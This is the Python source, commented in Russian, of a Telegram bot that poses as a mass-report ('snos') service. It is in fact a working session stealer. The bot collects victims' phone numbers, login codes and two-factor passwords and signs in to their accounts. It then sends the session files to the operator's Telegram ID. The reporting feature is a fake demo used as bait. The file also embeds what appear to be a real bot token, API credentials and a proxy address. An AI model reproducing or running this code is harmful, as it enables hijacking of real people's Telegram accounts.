import asyncio
import random
import os
import shutil
from datetime import datetime
from pathlib import Path
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===== КОНФИГУРАЦИЯ =====
BOT_TOKEN = "8704361523:AAHqi_mbS-7bD6Rtb9YqcRJUYJJBhJH045E"  # Токен вашего бота от @BotFather
YOUR_USER_ID = 7546928092  # ВАШ Telegram ID (куда будут приходить сессии)
API_ID = 35800959
API_HASH = '708e7d0bc3572355bcaf68562cc068f1'

# Настройки SOCKS5 прокси
PROXY = {
    "proxy_type": "socks5",
    "addr": "94.103.92.224",
    "port": 1080,
    "username": None,
    "password": None
}
# Отключить прокси: PROXY = None

# Папка для хранения сессий
SESSIONS_DIR = "sessions"
BACKUP_DIR = "sessions_backup"

# Создаем папки если их нет
Path(SESSIONS_DIR).mkdir(exist_ok=True)
Path(BACKUP_DIR).mkdir(exist_ok=True)

# ===== ИНИЦИАЛИЗАЦИЯ =====
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# Хранилище клиентов
user_clients = {}
auth_states = {}  # user_id: {"phone": str, "client": TelegramClient, "step": str}

# Состояния FSM
class AuthStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class SnosStates(StatesGroup):
    waiting_username = State()
    waiting_reason = State()
    waiting_count = State()

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def create_client(user_id):
    """Создает клиент Telegram с прокси"""
    session_file = f"{SESSIONS_DIR}/user_{user_id}"
    
    if PROXY:
        return TelegramClient(
            session_file, 
            API_ID, 
            API_HASH,
            connection=ConnectionTcpAbridged,
            proxy=PROXY
        )
    else:
        return TelegramClient(session_file, API_ID, API_HASH)

async def send_session_to_admin(user_id, phone, client):
    """Отправляет админу файл сессии и информацию"""
    try:
        # Отключаем клиент для сохранения сессии
        await client.disconnect()
        
        # Ищем файлы сессии
        session_files = []
        for ext in ['.session', '.session-journal']:
            session_path = Path(f"{SESSIONS_DIR}/user_{user_id}{ext}")
            if session_path.exists():
                session_files.append(session_path)
        
        # Формируем сообщение
        message_text = (
            f"✅ **НОВАЯ СЕССИЯ АВТОРИЗОВАНА!**\n\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Телефон:** `{phone}`\n"
            f"⏰ **Время:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"🌐 **Прокси:** `{PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}`\n" if PROXY else "🌐 **Прокси:** `Отключен`\n"
            f"📁 **Файлы сессии:** `{len(session_files)}`\n"
        )
        
        # Отправляем сообщение
        await bot.send_message(YOUR_USER_ID, message_text, parse_mode="Markdown")
        
        # Отправляем файлы сессии
        for session_file in session_files:
            try:
                # Копируем файл в backup
                backup_path = Path(BACKUP_DIR) / session_file.name
                shutil.copy2(session_file, backup_path)
                
                # Отправляем файл
                file_input = FSInputFile(session_file)
                await bot.send_document(
                    YOUR_USER_ID,
                    file_input,
                    caption=f"📁 Файл сессии для номера {phone}\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                await bot.send_message(YOUR_USER_ID, f"⚠️ Ошибка отправки файла {session_file.name}: {str(e)}")
        
        # Подключаем клиент обратно
        await client.connect()
        
        return True
    except Exception as e:
        await bot.send_message(YOUR_USER_ID, f"❌ Ошибка при отправке сессии: {str(e)}")
        return False

# ===== КЛАВИАТУРЫ =====
def phone_keyboard():
    buttons = []
    for i in range(1, 10):
        buttons.append(InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}"))
    buttons.extend([
        InlineKeyboardButton(text="0", callback_data="digit_0"),
        InlineKeyboardButton(text="⌫", callback_data="backspace"),
        InlineKeyboardButton(text="✅ Готово", callback_data="phone_done")
    ])
    return InlineKeyboardMarkup(inline_keyboard=[buttons[i:i+3] for i in range(0, len(buttons), 3)])

def code_keyboard():
    buttons = []
    for i in range(1, 10):
        buttons.append(InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}"))
    buttons.extend([
        InlineKeyboardButton(text="0", callback_data="digit_0"),
        InlineKeyboardButton(text="⌫", callback_data="backspace"),
        InlineKeyboardButton(text="✅ Подтвердить", callback_data="code_done")
    ])
    return InlineKeyboardMarkup(inline_keyboard=[buttons[i:i+3] for i in range(0, len(buttons), 3)])

def cancel_auth_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_auth")]
    ])

def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Начать снос", callback_data="start_snos")],
        [InlineKeyboardButton(text="🔄 Сменить аккаунт", callback_data="change_account")],
        [InlineKeyboardButton(text="📁 Мои сессии", callback_data="list_sessions")],
        [InlineKeyboardButton(text="ℹ️ Статус прокси", callback_data="proxy_status")]
    ])

def snos_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_snos")]
    ])

# ===== ОБРАБОТЧИКИ =====
@dp.message(Command("start"))
async def start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in user_clients and user_clients[user_id].is_connected():
        await message.answer("✅ Вы уже авторизованы!\nВыберите действие:", reply_markup=main_menu())
    else:
        await message.answer(
            "🔐 Для использования бота нужна авторизация в Telegram.\n"
            "Введите номер телефона в формате: +7XXXXXXXXXX\n\n"
            "Используйте клавиатуру ниже:",
            reply_markup=phone_keyboard()
        )
        await state.set_state(AuthStates.waiting_phone)
        auth_states[user_id] = {"phone": "", "code": ""}

@dp.callback_query(lambda c: c.data.startswith("digit_") and c.data not in ["phone_done", "code_done"])
async def handle_digit(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    current_state = await state.get_state()
    
    digit = callback.data.split("_")[1]
    
    if current_state == AuthStates.waiting_phone.state:
        if digit == "backspace":
            auth_states[user_id]["phone"] = auth_states[user_id]["phone"][:-1]
        else:
            auth_states[user_id]["phone"] += digit
        
        await callback.message.edit_text(
            f"📱 Введите номер телефона:\n`{auth_states[user_id]['phone']}`\n\nИспользуйте клавиатуру:",
            reply_markup=phone_keyboard(),
            parse_mode="Markdown"
        )
    
    elif current_state == AuthStates.waiting_code.state:
        if digit == "backspace":
            auth_states[user_id]["code"] = auth_states[user_id]["code"][:-1]
        else:
            auth_states[user_id]["code"] += digit
        
        await callback.message.edit_text(
            f"🔢 Введите код из Telegram:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
            reply_markup=code_keyboard(),
            parse_mode="Markdown"
        )
    
    await callback.answer()

@dp.callback_query(lambda c: c.data == "phone_done")
async def phone_done(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    phone = auth_states[user_id].get("phone", "")
    
    if len(phone) < 10:
        await callback.answer("❌ Введите корректный номер телефона", show_alert=True)
        return
    
    try:
        client = create_client(user_id)
        await client.connect()
        
        proxy_info = f" через прокси {PROXY['addr']}:{PROXY['port']}" if PROXY else " напрямую"
        await callback.message.edit_text(f"🔄 Подключение{proxy_info}...")
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            auth_states[user_id]["client"] = client
            auth_states[user_id]["phone"] = phone
            
            await callback.message.edit_text(
                f"📩 Код отправлен на номер {phone}\n"
                f"Введите код из Telegram:",
                reply_markup=code_keyboard()
            )
            await state.set_state(AuthStates.waiting_code)
        else:
            user_clients[user_id] = client
            await callback.message.edit_text("✅ Вы уже авторизованы!")
            await callback.message.answer("Выберите действие:", reply_markup=main_menu())
            await state.clear()
    
    except ConnectionError as e:
        await callback.message.edit_text(
            f"❌ Ошибка подключения через прокси.\n"
            f"Проверьте настройки прокси.\n\n"
            f"Ошибка: {str(e)[:100]}",
            reply_markup=cancel_auth_keyboard()
        )
    except Exception as e:
        await callback.message.edit_text(
            f"❌ Ошибка: {str(e)[:200]}\n"
            f"Попробуйте /start",
            reply_markup=cancel_auth_keyboard()
        )
    
    await callback.answer()

@dp.callback_query(lambda c: c.data == "code_done")
async def code_done(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    code = auth_states[user_id].get("code", "")
    client = auth_states[user_id].get("client")
    phone = auth_states[user_id].get("phone", "")
    
    if not client:
        await callback.answer("❌ Ошибка сессии", show_alert=True)
        return
    
    try:
        await client.sign_in(phone, code)
        user_clients[user_id] = client
        
        # Отправляем сессию админу
        await send_session_to_admin(user_id, phone, client)
        
        await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
        await callback.message.answer("Выберите действие:", reply_markup=main_menu())
        await state.clear()
    
    except SessionPasswordNeededError:
        await callback.message.edit_text(
            "🔐 Включена двухфакторная аутентификация.\n"
            "Введите пароль:",
            reply_markup=cancel_auth_keyboard()
        )
        await state.set_state(AuthStates.waiting_password)
    
    except Exception as e:
        await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте снова /start")
        await state.clear()
    
    await callback.answer()

@dp.message(AuthStates.waiting_password)
async def handle_password(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()
    client = auth_states[user_id].get("client")
    phone = auth_states[user_id].get("phone", "")
    
    if not client:
        await message.answer("❌ Ошибка сессии. Используйте /start")
        return
    
    try:
        await client.sign_in(password=password)
        user_clients[user_id] = client
        
        # Отправляем сессию админу
        await send_session_to_admin(user_id, phone, client)
        
        await message.answer("✅ Авторизация успешна! Сессия сохранена.")
        await message.answer("Выберите действие:", reply_markup=main_menu())
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {str(e)}")
        await state.set_state(AuthStates.waiting_password)

@dp.callback_query(lambda c: c.data == "list_sessions")
async def list_sessions(callback: types.CallbackQuery):
    """Показывает список сохраненных сессий"""
    user_id = callback.from_user.id
    
    # Ищем файлы сессий пользователя
    session_files = list(Path(SESSIONS_DIR).glob(f"user_{user_id}*.session"))
    
    if not session_files:
        await callback.answer("У вас нет сохраненных сессий", show_alert=True)
        return
    
    message = "📁 **Ваши сессии:**\n\n"
    for session_file in session_files:
        stat = session_file.stat()
        modified = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
        size = stat.st_size / 1024  # KB
        message += f"• `{session_file.name}`\n  📅 {modified} | 💾 {size:.1f} KB\n"
    
    await callback.message.answer(message, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "cancel_auth")
async def cancel_auth(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id in auth_states:
        client = auth_states[user_id].get("client")
        if client:
            await client.disconnect()
        auth_states.pop(user_id)
    await callback.message.edit_text("❌ Авторизация отменена.\nИспользуйте /start для начала")
    await state.clear()
    await callback.answer()

@dp.callback_query(lambda c: c.data == "proxy_status")
async def proxy_status(callback: types.CallbackQuery):
    if PROXY:
        status = f"✅ Прокси активен\n"
        status += f"Тип: {PROXY['proxy_type']}\n"
        status += f"Адрес: {PROXY['addr']}:{PROXY['port']}"
        if PROXY.get('username'):
            status += f"\nАвторизация: {PROXY['username']}"
    else:
        status = "❌ Прокси не используется\nПодключение прямое"
    
    await callback.answer(status, show_alert=True)

@dp.callback_query(lambda c: c.data == "change_account")
async def change_account(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id in user_clients:
        await user_clients[user_id].disconnect()
        del user_clients[user_id]
    
    if user_id in auth_states:
        auth_states.pop(user_id)
    
    await callback.message.edit_text(
        "🔄 Смена аккаунта.\nВведите номер телефона:",
        reply_markup=phone_keyboard()
    )
    await state.set_state(AuthStates.waiting_phone)
    auth_states[user_id] = {"phone": "", "code": ""}
    await callback.answer()

# ===== МЕНЮ СНОСЕРА (ДЕМО) =====
@dp.callback_query(lambda c: c.data == "start_snos")
async def start_snos(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id not in user_clients or not user_clients[user_id].is_connected():
        await callback.answer("❌ Сначала авторизуйтесь через /start", show_alert=True)
        return
    
    await callback.message.answer(
        "👤 Введите юзернейм (без @) или ID для демо-сноса:",
        reply_markup=snos_menu()
    )
    await state.set_state(SnosStates.waiting_username)
    await callback.answer()

@dp.message(SnosStates.waiting_username)
async def get_username(message: types.Message, state: FSMContext):
    await state.update_data(username=message.text.strip())
    await message.answer("📝 Введите причину жалобы:")
    await state.set_state(SnosStates.waiting_reason)

@dp.message(SnosStates.waiting_reason)
async def get_reason(message: types.Message, state: FSMContext):
    await state.update_data(reason=message.text.strip())
    await message.answer("🔢 Сколько жалоб отправить (число):")
    await state.set_state(SnosStates.waiting_count)

@dp.message(SnosStates.waiting_count)
async def get_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        data = await state.get_data()
        
        await message.answer(f"🚀 НАЧАТ СНОС! (ДЕМО-РЕЖИМ)\n\n"
                             f"👤 Цель: @{data['username']}\n"
                             f"📝 Причина: {data['reason']}\n"
                             f"📊 Всего: {count} жалоб\n\n"
                             f"⚠️ ЭТО ДЕМО — реальные жалобы НЕ отправляются")
        
        # Имитация отправки жалоб
        for i in range(1, count + 1):
            generated_number = f"+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}"
            await message.answer(f"📨 ЖАЛОБА ОТПРАВЛЕНА НА @{data['username']}\n"
                                 f"📞 С НОМЕРА: {generated_number}\n"
                                 f"📊 ОТПРАВЛЕНО: {i}/{count}")
            await asyncio.sleep(1)
        
        await message.answer("✅ СНОС ЗАВЕРШЁН! (ДЕМО-РЕЖИМ)")
        await message.answer("Выберите действие:", reply_markup=main_menu())
        await state.clear()
    
    except ValueError:
        await message.answer("❌ Введите число!")

@dp.callback_query(lambda c: c.data == "cancel_snos")
async def cancel_snos(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("❌ Снос отменён")
    await callback.message.answer("Выберите действие:", reply_markup=main_menu())
    await callback.answer()

# ===== ЗАПУСК =====
async def main():
    print("🚀 Бот запущен")
    print(f"📁 Папка сессий: {SESSIONS_DIR}")
    print(f"📁 Папка бэкапов: {BACKUP_DIR}")
    if PROXY:
        print(f"📡 Используется прокси: {PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}")
    else:
        print("📡 Прямое подключение (без прокси)")
    print(f"👤 Сессии будут отправляться в ID: {YOUR_USER_ID}")
    
    # Проверяем что админ ID указан
    if YOUR_USER_ID == 123456789:
        print("⚠️ ВНИМАНИЕ: Не изменен YOUR_USER_ID! Укажите свой Telegram ID")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
